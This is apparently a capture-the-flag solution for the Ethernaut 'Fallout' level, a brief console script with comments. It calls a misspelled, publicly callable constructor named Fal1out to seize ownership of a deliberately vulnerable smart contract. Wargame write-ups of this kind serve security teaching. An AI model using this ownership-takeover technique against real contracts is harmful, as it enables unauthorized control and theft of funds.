await contract.owner();
// >> returns some owner address

// note that the constructor is not a constructor, the function name is spelt wrong
// so we can call it, and it makes us the owner
await contract.Fal1out.send({ from: player, value: toWei("0.001", "ether") });
// >> I am now the contract owner

await contract.owner();
// >> returns my address

// submit
